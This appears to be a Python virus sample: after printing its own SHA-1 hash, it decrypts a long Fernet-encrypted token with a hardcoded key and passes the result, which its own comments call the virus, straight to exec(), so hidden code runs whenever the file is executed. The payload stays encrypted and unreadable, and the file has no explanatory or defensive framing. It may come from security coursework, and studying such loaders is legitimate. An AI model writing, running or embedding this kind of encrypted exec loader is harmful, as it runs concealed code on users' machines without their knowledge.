import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# START
key = "-JbbnISwqQMqtDIXIzSCn4etWWWh7iu3KcsQ-T4zH3I="
token = "gAAAAABnNgKR6pVX1BBMsFmG3slvLEDzmA0p5rv6DVkx0k_o-GncZIuL7aFSBvma2ogDIg0bhUksiQr5hOou6SsAfaD2Dn0XgTQuv4_unh995S3RFidkQmGm4r-6Brr0xQ9qefmXqJk62Bq1RXb1nbXQ-TrHi3ouUvvZoQwVfyfscxTJ559urWZrNvY7nwBrH1I6k_1FRr9p0xgYgIdUd-oLMG4cf2E4B-2zruE6Jw8pNUW_UUSMqezoj5qszZCQLwL3nxkoRz74bRUaP9W3WG27QrDksUWgB4gBRJEaeejJCeBCZTXhNKv9I0aOsVrBiGavH0DttKdWPgSlPIS7wtHRTixPFUw3AeGd6zcktGcPcUMcWHQ-D0fJm5FC2rdfT2dkrGnHJzJTxO-sZiWzlq2ywhFmjGdLgRp2BlrwM8360kbDmKQmotqVhqkwf7PdP6b5XdsFJxHkZ5AdYVCeg8W6ctFNKnpno9eMEUbAAQOhitxCDQJEEVhdaMcYEQlAll2g3eLDHSFtoG1fvv6ajGaMfOZ6bl6QXFchTd8xXL2Sg-HPPFNxl1aQwS4W2w5PMN39J3cYTHZmfLeQl4cV7qpcd3i6uUWneH9LNl1QRW2argbUXGq19ea25m15mfIh3zKPHxUWFELEznoRqrmXb2BQE6-3fp9Td97pQlwNXvIR9yPMWGDAoF2tqbpBsb6hKTjq-q6yY_sShfJqoLuUEIE9ELAuEbcaQ2bzKYYmQfQvIypnwccv1rCopvfmUWJLDgeU59hFb2Z6inbEz8WVOtJ4xb-45XZtuOaw8YJgMavA8_dUDivkTaO_I6xKvLS5-h1fKHA3T7tEIipdnOPeZmSPQzP0rwrzcmIU9BLZ3cIg_RUXfaAaqpAx14X_X0e8VONWsv5L8o9PTfBfNVkroQNJzUcJXwJqjubkSo5xCeXyi_8UTyz6CuTFnvL5pUjwnOW_bOTJPQiENI45PG6UJvC_QK1zPxmdxyfrdQstksSFsitPWGGiEIU1fvukaZQnSHE5KOjvC2UlglacDMftRdidI3zePxpwuq5BIx9a5c2AkV3TZsQoxpehOMluwLMzkQTrDwfg5YJEw5PIA7QUSp6v1VBTTihAhl6_Qw4Y2bLGbzgMoYdVcc2rshWmAagb9KJikSQPRabZiX8bEZCu2O36D-TJ5H-5ou4OP1srl8qTSapnUm4vX_ro1Ed1mJJ7jyX-dsK7J5klzW514ia5hdSO_3uee9DcBF5nERr555Tcj9PvvZuoavq8PKBPRB1DQc-u0-sFk5-XyepVm2ohJYQq7LqzrQ_vWMKT46GtNw20Jj9_bdcc2wsCcOxUMxNhvU3d94R9CJStbNj9NsWM8-naK4Pig6oCWFlwUXToTl0WjUs65xagz6_DP6Jnw6uXUbRVVzERWpaHcBuS9peLa496MrRX9GL7HrCbCnqtI-4HUULlbZRMDzsuZkUQS9csTDKAqRlVW-X4M7KbFYRBXqd2hSmGLSMIysIOHn-kXdSi7pgCAlqhqqKYlzBBWlUFJPicpSr5rsjYzGMMcAVXYInV46gad_B_OEA5TfOg7drqVuf_7ov8jFrJgQE3MkMNbrFKiK34CEpeMyz5mIoKMpQzo4iFiimAxxmXFn3OznOpisIpQSI8kTONEfdwEYmwjtylnAcJ0fagf-8HhZ8m4jeCgNsi_CwDOSCJpNqZQjunqd14UVGxcivA7UkCyhpojhoh3B1MKMAHW68KmfH5plvpe4MZ3FSpzGwD4Or3qon73HIIxezF005-_eyrjRO1DtyLzbucOPKjjHfEB5XNrPS2kRsTcE_z7fxYh-H6GQne2L3oCPE0wXThKzgWJlznJ5A6m6sAN2W4jdlzEhgB4wCHLD549I4iMcVA5gaBizOSPogKfrsoLVXfWEY8QgpRXE2_9MqKRXVmZjfhFXwzSzZqmvF5TReCxwJOTQC1FahoKaH5vvYBDgY="

decrypt(token, key)
